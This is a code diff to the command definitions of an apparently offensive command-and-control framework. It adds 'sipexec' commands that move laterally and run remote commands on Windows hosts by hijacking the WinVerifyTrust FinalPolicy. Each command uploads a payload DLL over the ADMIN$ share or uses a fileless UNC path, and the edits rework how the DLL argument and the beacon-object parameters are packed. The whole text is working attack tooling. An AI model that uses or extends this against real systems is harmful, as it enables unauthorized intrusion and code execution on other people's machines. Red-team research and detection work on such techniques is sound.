@@ -152,9 +152,9 @@ _cmd_jump_sipexec.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines
     let guid = parsed_json["guid"];
     let no_cleanup = parsed_json["--no-cleanup"] ? 1 : 0;
 
-    // Pack: mode(short) target(cstr) command(cstr) dll_len(int) dll_data(bytes) dll_path_override(cstr) share(cstr) guid(cstr) no_cleanup(short)
-    let bof_params = ax.bof_pack("short,cstr,cstr,int,bytes,cstr,cstr,cstr,short",
-        [0, target, "", dll_content.length, dll_content, "", share, guid, no_cleanup]);
+    // Pack: mode(short) target(cstr) command(cstr) dll_data(bytes) dll_path_override(cstr) share(cstr) guid(cstr) no_cleanup(short)
+    let bof_params = ax.bof_pack("short,cstr,cstr,bytes,cstr,cstr,cstr,short",
+        [0, target, "", dll_content, "", share, guid, no_cleanup]);
     let bof_path = bof_dir + "tmb_sipexec.o";
     let message = `Task: SIPExec jump to ${target} via FinalPolicy hijack`;
 
@@ -162,11 +162,11 @@ _cmd_jump_sipexec.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines
 });
 
 // ---- invoke sipexec (remote-exec equivalent) ----
-var _cmd_invoke_sipexec = ax.create_command("sipexec", "Remote command execution via WinVerifyTrust FinalPolicy hijack + named pipe", "invoke sipexec 192.168.0.1 \"whoami /all\" --dll /tmp/payload.dll -g default");
+var _cmd_invoke_sipexec = ax.create_command("sipexec", "Remote command execution via WinVerifyTrust FinalPolicy hijack + named pipe", "invoke sipexec 192.168.0.1 /tmp/payload.dll \"whoami /all\" -g default");
 _cmd_invoke_sipexec.addArgString("target", true);
+_cmd_invoke_sipexec.addArgFile("dll", true);
 _cmd_invoke_sipexec.addArgString("cmd", true);
-_cmd_invoke_sipexec.addArgFile("--dll", false);
-_cmd_invoke_sipexec.addArgFlagString("--unc", "unc_path", "Use existing UNC path (fileless on target)", "");
+_cmd_invoke_sipexec.addArgFlagString("--unc", "unc_path", "Use existing UNC path instead of uploading DLL (fileless on target)", "");
 _cmd_invoke_sipexec.addArgFlagString("-s", "share", "Upload share", "ADMIN$");
 _cmd_invoke_sipexec.addArgFlagString("-g", "guid", "FinalPolicy GUID alias", "default");
 _cmd_invoke_sipexec.addArgBool("--no-cleanup", "Skip cleanup");
@@ -178,23 +178,15 @@ _cmd_invoke_sipexec.setPreHook(function (id, cmdline, parsed_json, ...parsed_lin
     let no_cleanup = parsed_json["--no-cleanup"] ? 1 : 0;
     let unc_path = parsed_json["unc_path"] || "";
 
-    let dll_content = parsed_json["--dll"] || "";
-    let dll_len = dll_content.length;
+    let dll_content = parsed_json["dll"];
 
-    // If UNC override, no upload
+    // If UNC override, skip upload
     if (unc_path.length > 0) {
         dll_content = "";
-        dll_len = 0;
-    } else if (dll_len == 0) {
-        // Use bundled payload
-        let bundled_path = ax.script_dir() + "../sipexec/sipexec_payload_impersonate.dll";
-        dll_content = ax.read_file(bundled_path);
-        dll_len = dll_content.length;
-        if (dll_len == 0) throw new Error("Cannot read bundled payload DLL: " + bundled_path);
     }
 
-    let bof_params = ax.bof_pack("short,cstr,cstr,int,bytes,cstr,cstr,cstr,short",
-        [1, target, cmd, dll_len, dll_content, unc_path, share, guid, no_cleanup]);
+    let bof_params = ax.bof_pack("short,cstr,cstr,bytes,cstr,cstr,cstr,short",
+        [1, target, cmd, dll_content, unc_path, share, guid, no_cleanup]);
     let bof_path = bof_dir + "tmb_sipexec.o";
     let message = `Task: SIPExec exec on ${target}: ${cmd}`;
 
